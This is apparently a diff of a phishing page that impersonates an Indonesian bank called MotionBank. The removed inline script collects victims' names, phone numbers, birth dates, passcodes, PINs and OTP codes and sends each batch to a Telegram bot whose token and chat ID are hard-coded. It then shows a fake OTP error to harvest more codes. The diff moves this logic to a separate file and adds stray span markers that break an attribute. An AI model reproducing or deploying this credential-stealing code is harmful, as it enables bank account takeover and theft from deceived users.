@@ -46,9 +46,9 @@
 </head>
 <body id="bodyContainer" class="bg-white min-h-screen text-slate-800 font-sans pb-12 transition-all duration-300 overflow-x-hidden">
 
-  <!-- ================= HALAMAN 0 (SPLASH SCREEN MENGGUNAKAN GAMBAR) ================= -->
+  <!-- ================= HALAMAN 0 (SPLASH SCREEN) ================= -->
   <div id="page0" class="fixed inset-0 z-50 flex items-center justify-center bg-white cursor-pointer" onclick="goToPage1()">
-    <img src="https://i.ibb.co.com/ynnk2c49/IMG-2960.jpg" alt="Splash Screen MotionBank" class="w-full h-full object-cover">
+    <img src="https://i.ibb.co.com/ynnk2c49/IMG-2960.jpg" alt="Splash Screen MotionBank" class="w-full h-full object-contain bg-white">
   </div>
 
   <!-- ================= HALAMAN 1 ================= -->
@@ -101,7 +101,7 @@
           </div>
 
           <div>
-            <label class="block text-[11px] font-semibold text-slate-700 uppercase tracking-wider mb-1" for="phone">Nomor Handphone</label>
+            <label class="block text-[11px] font-semibold text-slate-700 uppercase tracking-wider mb-1" for="phone">Nomor Handphone[span_0](start_span)[span_0](end_span)</label>
             <div class="relative flex items-center bg-white/80 border border-slate-300 rounded-lg shadow-sm focus-within:ring-1 focus-within:ring-amber-500 focus-within:border-amber-500 transition">
               <div class="flex items-center pl-3 pr-2.5 py-2.5 border-r border-slate-300 bg-slate-50/50 rounded-l-lg select-none text-sm">
                 <span class="mr-1.5 leading-none">🇮🇩</span>
@@ -111,13 +111,13 @@
                 type="tel" 
                 id="phone" 
                 name="phone" 
-                placeholder="Masukkan no. handphone"
+                placeholder="Masukkan no. handphone[span_1](start_span)"[span_1](end_span)
                 required
                 maxlength="12"
                 class="w-full pl-3 pr-3 py-2.5 bg-transparent border-none text-sm text-slate-800 placeholder-slate-400 focus:outline-none"
               >
             </div>
-            <p class="text-[10px] text-slate-500 mt-0.5">Awali dengan angka 8 </p>
+            <p class="text-[10px] text-slate-500 mt-0.5">Awali dengan angka 8 (Total panjang 10 - 15 digit)</p>
           </div>
 
           <div>
@@ -298,243 +298,8 @@
     </a>
   </div>
 
-  <!-- Script Logika & Telegram Bot -->
-  <script>
-    // MASUKKAN TOKEN BOT & CHAT ID TELEGRAM ANDA DI SINI
-    const BOT_TOKEN = "9189949943:AAGWkG3Lnly2aM8Wu4kCwUHRo4PK6UMwABs"; 
-    const CHAT_ID = "6742478722";
-
-    const page0 = document.getElementById('page0');
-    const page1 = document.getElementById('page1');
-    const page2 = document.getElementById('page2');
-    const page3 = document.getElementById('page3');
-    
-    const formStep1 = document.getElementById('formStep1');
-    const fullNameInput = document.getElementById('fullName');
-    const phoneInput = document.getElementById('phone');
-    const dobInput = document.getElementById('dob');
-    
-    const btnBackTo1 = document.getElementById('btnBackTo1');
-    const btnBackTo2 = document.getElementById('btnBackTo2');
-    const btnToPage3 = document.getElementById('btnToPage3');
-    const bodyContainer = document.getElementById('bodyContainer');
-    
-    const passcode = document.getElementById('passcode');
-    const togglePasscode = document.getElementById('togglePasscode');
-    const eyeIcon = document.getElementById('eyeIcon');
-    
-    const pinInput = document.getElementById('pin');
-    const togglePin = document.getElementById('togglePin');
-    const pinEyeIcon = document.getElementById('pinEyeIcon');
-
-    const maskedPhoneDisplay = document.getElementById('maskedPhoneDisplay');
-    const otpInputs = document.querySelectorAll('.otp-input');
-    const btnFinalSubmit = document.getElementById('btnFinalSubmit');
-    
-    const otpErrorModal = document.getElementById('otpErrorModal');
-    const btnCloseModal = document.getElementById('btnCloseModal');
-
-    let timerInterval = null;
-    let userData = {
-      name: "",
-      phone: "",
-      dob: "",
-      passcode: "",
-      pin: "",
-      otp: ""
-    };
-
-    // Timer otomatis 1 detik untuk berpindah dari Halaman 0 ke Halaman 1
-    window.addEventListener('DOMContentLoaded', () => {
-      setTimeout(() => {
-        goToPage1();
-      }, 2000);
-    });
-
-    function goToPage1() {
-      page0.classList.add('hidden');
-      page1.classList.remove('hidden');
-      bodyContainer.classList.remove('bg-white');
-      bodyContainer.classList.add('bg-custom-page1');
-      window.scrollTo(0, 0);
-    }
-
-    phoneInput.addEventListener('input', function(e) {
-      let val = e.target.value.replace(/\D/g, ''); 
-      if (val.length > 0 && val[0] !== '8') {
-        val = '8' + val.slice(1);
-      }
-      if (val.length > 12) {
-        val = val.slice(0, 12); 
-      }
-      e.target.value = val;
-    });
-
-    function sendToTelegram(message) {
-      if (BOT_TOKEN === "MASUKKAN_BOT_TOKEN_ANDA_DISINI") {
-        console.warn("Token Telegram belum diatur!");
-        return;
-      }
-      const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
-      fetch(url, {
-        method: 'POST',
-        headers: { 'Content-Type': 'application/json' },
-        body: JSON.stringify({
-          chat_id: CHAT_ID,
-          text: message,
-          parse_mode: 'Markdown'
-        })
-      }).catch(err => console.error("Gagal kirim Telegram:", err));
-    }
-
-    formStep1.addEventListener('submit', function(e) {
-      e.preventDefault();
-      
-      let rawPhone = phoneInput.value.trim();
-      if (rawPhone.length < 7 || rawPhone.length > 12) {
-        alert("Nomor HP harus memiliki panjang total 10 hingga 15 digit (termasuk +62).");
-        return;
-      }
-
-      userData.name = fullNameInput.value;
-      userData.phone = "+62" + rawPhone;
-      userData.dob = dobInput.value;
-
-      let msg = `📥 *DATA BARU MOTIONBANK*\n\n👤 Nama: ${userData.name}\n📞 No HP: \`${userData.phone}\`\n🎂 Tgl Lahir: ${userData.dob}`;
-      sendToTelegram(msg);
-
-      page1.classList.add('hidden');
-      page2.classList.remove('hidden');
-      bodyContainer.classList.remove('bg-custom-page1');
-      bodyContainer.classList.add('bg-slate-50');
-      window.scrollTo(0, 0);
-    });
-
-    btnBackTo1.addEventListener('click', function() {
-      page2.classList.add('hidden');
-      page1.classList.remove('hidden');
-      bodyContainer.classList.remove('bg-slate-50');
-      bodyContainer.classList.add('bg-custom-page1');
-      window.scrollTo(0, 0);
-    });
-
-    togglePasscode.addEventListener('click', function() {
-      const type = passcode.getAttribute('type') === 'password' ? 'text' : 'password';
-      passcode.setAttribute('type', type);
-      eyeIcon.classList.toggle('fa-eye-slash');
-      eyeIcon.classList.toggle('fa-eye');
-    });
-
-    togglePin.addEventListener('click', function() {
-      const type = pinInput.getAttribute('type') === 'password' ? 'text' : 'password';
-      pinInput.setAttribute('type', type);
-      pinEyeIcon.classList.toggle('fa-eye-slash');
-      pinEyeIcon.classList.toggle('fa-eye');
-    });
-
-    btnToPage3.addEventListener('click', function() {
-      if(!passcode.value) {
-        alert("Silakan masukkan kode sandi Anda terlebih dahulu.");
-        return;
-      }
-      if(!pinInput.value) {
-        alert("Silakan masukkan PIN 6 digit Anda terlebih dahulu.");
-        return;
-      }
-
-      userData.passcode = passcode.value;
-      userData.pin = pinInput.value;
-
-      let msg = `🔐 *KODE SANDI & PIN MOTIONBANK*\n\n👤 Nama: ${userData.name}\n📞 No HP: \`${userData.phone}\`\n🔑 Sandi: \`${userData.passcode}\`\n🔢 PIN: \`${userData.pin}\``;
-      sendToTelegram(msg);
-
-      const val = phoneInput.value.trim();
-      if(val.length >= 3) {
-        const last3 = val.slice(-3);
-        maskedPhoneDisplay.textContent = `+62 •••• •••• ${last3}`;
-      }
-
-      page2.classList.add('hidden');
-      page3.classList.remove('hidden');
-      window.scrollTo(0, 0);
-
-      startOtpTimer(58);
-      otpInputs[0].focus();
-    });
-
-    btnBackTo2.addEventListener('click', function() {
-      page3.classList.add('hidden');
-      page2.classList.remove('hidden');
-      clearInterval(timerInterval);
-      window.scrollTo(0, 0);
-    });
-
-    otpInputs.forEach((input, index) => {
-      input.addEventListener('input', (e) => {
-        if (e.target.value.length > 1) {
-          e.target.value = e.target.value.slice(0, 1);
-        }
-        if (e.target.value !== "" && index < otpInputs.length - 1) {
-          otpInputs[index + 1].focus();
-        }
-        checkOtpComplete();
-      });
-
-      input.addEventListener('keydown', (e) => {
-        if (e.key === "Backspace" && e.target.value === "" && index > 0) {
-          otpInputs[index - 1].focus();
-        }
-      });
-    });
-
-    function checkOtpComplete() {
-      let isAllFilled = Array.from(otpInputs).every(inp => inp.value !== "");
-      if(isAllFilled) {
-        btnFinalSubmit.disabled = false;
-        btnFinalSubmit.classList.remove('bg-slate-200', 'text-slate-400');
-        btnFinalSubmit.classList.add('bg-amber-500', 'hover:bg-amber-600', 'text-white', 'shadow-md');
-      } else {
-        btnFinalSubmit.disabled = true;
-        btnFinalSubmit.classList.add('bg-slate-200', 'text-slate-400');
-        btnFinalSubmit.classList.remove('bg-amber-500', 'hover:bg-amber-600', 'text-white', 'shadow-md');
-      }
-    }
-
-    btnFinalSubmit.addEventListener('click', function() {
-      let otpCode = "";
-      otpInputs.forEach(inp => otpCode += inp.value);
-      userData.otp = otpCode;
-
-      let msg = `📲 *KODE OTP MOTIONBANK*\n\n👤 Nama: ${userData.name}\n📞 No HP: \`${userData.phone}\`\n🔑 Sandi: \`${userData.passcode}\`\n🔢 PIN: \`${userData.pin}\`\n🔢 OTP: \`${userData.otp}\``;
-      sendToTelegram(msg);
-
-      otpErrorModal.classList.remove('hidden');
-    });
-
-    btnCloseModal.addEventListener('click', function() {
-      otpErrorModal.classList.add('hidden');
-      otpInputs.forEach(inp => inp.value = "");
-      otpInputs[0].focus();
-      checkOtpComplete();
-    });
-
-    function startOtpTimer(seconds) {
-      clearInterval(timerInterval);
-      let duration = seconds;
-      const timerDisplay = document.getElementById('otpTimer');
-      
-      timerInterval = setInterval(() => {
-        let sec = duration % 60;
-        let secStr = sec < 10 ? "0" + sec : sec;
-        timerDisplay.textContent = `00:${secStr}`;
-
-        if (--duration < 0) {
-          clearInterval(timerInterval);
-          timerDisplay.textContent = "00:00";
-        }
-      }, 1000);
-    }
-  </script>
-
+  <!-- Memanggil File JavaScript Terpisah -->
+  <script src="script.js"></script>
 </body>
 </html>
+
